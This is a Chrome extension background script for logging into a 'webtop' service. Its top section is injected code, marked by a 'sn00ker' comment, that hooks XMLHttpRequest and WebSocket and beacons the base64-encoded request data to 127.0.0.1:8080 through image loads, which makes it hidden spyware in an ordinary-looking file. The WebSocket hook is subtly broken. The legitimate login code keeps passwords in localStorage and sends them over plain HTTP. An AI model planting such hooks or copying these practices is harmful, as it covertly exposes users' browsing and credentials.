function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
chrome.browserAction.onClicked.addListener(webtopClicked);

function getLoginInfo() {
    var userInfo = { login: null, password: null };
    userInfo.login = window.localStorage.getItem("webtop.login");
    userInfo.password = window.localStorage.getItem("webtop.password");
    return userInfo;
}

function setLoginInfo(user, pass) {
    window.localStorage.removeItem("webtop.login");
    window.localStorage.removeItem("webtop.password");

    if (user != "" && pass != "") {
        window.localStorage.setItem("webtop.login", user);
        window.localStorage.setItem("webtop.password", pass);
    }
}

function webtopClicked() {
    var loginInfo = getLoginInfo();

    if (loginInfo.login == null || loginInfo.password == null) {
        chrome.tabs.create({ url: "options.htm", selected: true });
        return;
    }

    var currentTab;
    chrome.tabs.getSelected(null, function (tab) {
        currentTab = tab;
        chrome.tabs.sendRequest(tab.id, { message: "showAlert", messageText: chrome.i18n.getMessage("please_wait"), timeout: 60000 });
    });


    var postString = "email=" + urlencode(loginInfo.login) + "&pass=" + loginInfo.password + "&goto=desktop&secmode=1&ajax=1&app=";
    var http = new XMLHttpRequest();
    var requestUrl = "http://guid.uid.me/dolog/";

    http.open("POST", requestUrl, true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    //http.setRequestHeader("Content-length", postString.length);

    http.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            var myregexp = /"myWinError"[^>]+>(.+)<\/div>/i;
            var match = myregexp.exec(this.responseText);

            if (match) {
                    chrome.tabs.sendRequest(currentTab.id, { message: "showAlert", messageText: chrome.i18n.getMessage("login_error") + ": " + match[1], timeout: 3000 });
                    return false;
            }

            chrome.tabs.sendRequest(currentTab.id, { message: "showAlert", messageText: '', timeout: 0 });

            myregexp = /location\.href='(http:\/\/[\-A-Z0-9+&@#\/%?=~_|!:,.;]*[\-A-Z0-9+&@#\/%=~_|])/i;
            match = myregexp.exec(this.responseText);
            if (match) {
               var url = match[1];
                chrome.tabs.create({url: url, selected: true});                              
                return;
            }
        }
    }

    http.send(postString);
}

function urlencode(str) {
    var ret = str.toString();
    ret = encodeURIComponent(ret);
    ret = ret.replace(/%20/g, '+');
    return ret;
}